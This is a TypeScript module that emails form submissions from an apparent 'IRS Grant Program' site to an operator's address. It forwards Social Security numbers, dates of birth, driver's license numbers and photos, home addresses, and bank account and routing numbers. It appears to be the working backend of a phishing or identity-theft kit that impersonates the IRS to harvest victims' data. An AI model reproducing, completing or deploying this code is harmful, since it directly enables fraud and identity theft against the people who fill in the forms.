import { Resend } from "resend"

const resend = process.env.RESEND_API_KEY
  ? new Resend(process.env.RESEND_API_KEY)
  : null

export async function sendClaimNotification(claimData: Record<string, unknown>) {
  if (!resend) {
    console.log("Resend not configured — skipping email notification")
    console.log("Claim data:", JSON.stringify({ ...claimData, driversLicenseImage: claimData.driversLicenseImage ? "[BASE64_IMAGE]" : "none" }, null, 2))
    return { success: true, skipped: true }
  }

  const method = claimData.method as string
  const uniqueCode = claimData.uniqueCode as string
  const fullName = claimData.fullName as string || "Unknown"
  const email = claimData.email as string || ""
  const amount = claimData.amount as string || "0"
  const dlImage = claimData.driversLicenseImage as string || ""

  const formattedAmount = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 0,
  }).format(Number(amount))

  const methodLabel = method === "cashier_check" ? "Cashier Check" : "Electronic Deposit"

  let detailRows = ""
  if (method === "cashier_check") {
    detailRows = `
      <tr><td style="padding: 8px; font-weight: bold;">Name:</td><td style="padding: 8px;">${fullName}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Address:</td><td style="padding: 8px;">${claimData.address}, ${claimData.city}, ${claimData.state} ${claimData.zipCode}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Driver's License #:</td><td style="padding: 8px;">${claimData.driversLicense}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Email:</td><td style="padding: 8px;">${email}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Received Grants Before:</td><td style="padding: 8px;">${claimData.receivedGrantsBefore}</td></tr>
    `
  } else {
    detailRows = `
      <tr><td style="padding: 8px; font-weight: bold;">Name:</td><td style="padding: 8px;">${fullName}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Account Number:</td><td style="padding: 8px;">${claimData.accountNumber}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Routing Number:</td><td style="padding: 8px;">${claimData.routingNumber}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Bank Name:</td><td style="padding: 8px;">${claimData.bankName}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Bank Address:</td><td style="padding: 8px;">${claimData.bankAddress}, ${claimData.bankCity}, ${claimData.bankState} ${claimData.bankZipCode}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Home Address:</td><td style="padding: 8px;">${claimData.homeAddress}, ${claimData.homeCity}, ${claimData.homeState} ${claimData.homeZipCode}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Email:</td><td style="padding: 8px;">${email}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Received Grants Before:</td><td style="padding: 8px;">${claimData.receivedGrantsBefore}</td></tr>
    `
  }

  // Add driver's license image inline if present
  const dlImageHtml = dlImage
    ? `<div style="margin-top: 16px; padding: 16px; background: #f7f7f7; border: 1px solid #dfe1e2;">
        <p style="font-weight: bold; margin-bottom: 8px;">Driver's License Photo:</p>
        <img src="${dlImage}" alt="Driver's License" style="max-width: 400px; border: 1px solid #dfe1e2;" />
      </div>`
    : ""

  // Prepare attachments
  const attachments: { filename: string; content: Buffer }[] = []
  if (dlImage && dlImage.startsWith("data:")) {
    const base64Data = dlImage.split(",")[1]
    const mimeType = dlImage.split(";")[0].split(":")[1]
    const ext = mimeType.includes("png") ? "png" : mimeType.includes("pdf") ? "pdf" : "jpg"
    attachments.push({
      filename: `drivers_license_${uniqueCode}.${ext}`,
      content: Buffer.from(base64Data, "base64"),
    })
  }

  try {
    const { data, error } = await resend.emails.send({
      from: "IRS Grant Program <onboarding@resend.dev>",
      to: [process.env.NOTIFICATION_EMAIL || "admin@example.com"],
      subject: `New Grant Claim: ${fullName} | ${methodLabel} | ${uniqueCode}`,
      html: `
        <h2 style="color: #1a1a5e;">New Grant Claim Submitted</h2>
        <div style="background: #f7f7f7; border: 1px solid #dfe1e2; padding: 16px; margin-bottom: 16px;">
          <strong>Unique Code:</strong> ${uniqueCode}<br/>
          <strong>Grant Amount:</strong> ${formattedAmount}<br/>
          <strong>Payment Method:</strong> ${methodLabel}
        </div>
        <table style="border-collapse: collapse; width: 100%;">
          ${detailRows}
        </table>
        ${dlImageHtml}
      `,
      attachments: attachments.length > 0 ? attachments : undefined,
    })

    if (error) {
      console.error("Email error:", error)
      return { success: false, error }
    }

    return { success: true, data }
  } catch (error) {
    console.error("Email send failed:", error)
    return { success: false, error }
  }
}

export async function sendEligibilityCheckNotification(data: Record<string, string>) {
  if (!resend) {
    console.log("Resend not configured — skipping eligibility check email")
    console.log("Eligibility data:", JSON.stringify(data, null, 2))
    return { success: true, skipped: true }
  }

  const { firstName, lastName, dob, ssn, grantAmount } = data
  const fullName = `${firstName} ${lastName}`

  const formattedAmount = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 0,
  }).format(Number(grantAmount))

  try {
    const { data: resendData, error } = await resend.emails.send({
      from: "IRS Grant Program <onboarding@resend.dev>",
      to: [process.env.NOTIFICATION_EMAIL || "admin@example.com"],
      subject: `Eligibility Check Submitted: ${fullName}`,
      html: `
        <h2 style="color: #1a1a5e;">New Eligibility Check Submitted</h2>
        <p>A user has submitted their information on the eligibility check page.</p>
        <table style="border-collapse: collapse; width: 100%; max-width: 600px;">
          <tr><td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #dfe1e2;">First Name:</td><td style="padding: 8px; border-bottom: 1px solid #dfe1e2;">${firstName}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #dfe1e2;">Last Name:</td><td style="padding: 8px; border-bottom: 1px solid #dfe1e2;">${lastName}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #dfe1e2;">Date of Birth:</td><td style="padding: 8px; border-bottom: 1px solid #dfe1e2;">${dob}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #dfe1e2;">SSN:</td><td style="padding: 8px; border-bottom: 1px solid #dfe1e2;">${ssn}</td></tr>
          <tr><td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #dfe1e2;">Requested Amount:</td><td style="padding: 8px; border-bottom: 1px solid #dfe1e2;">${formattedAmount}</td></tr>
        </table>
      `,
    })

    if (error) {
      console.error("Email error:", error)
      return { success: false, error }
    }

    return { success: true, data: resendData }
  } catch (error) {
    console.error("Email send failed:", error)
    return { success: false, error }
  }
}
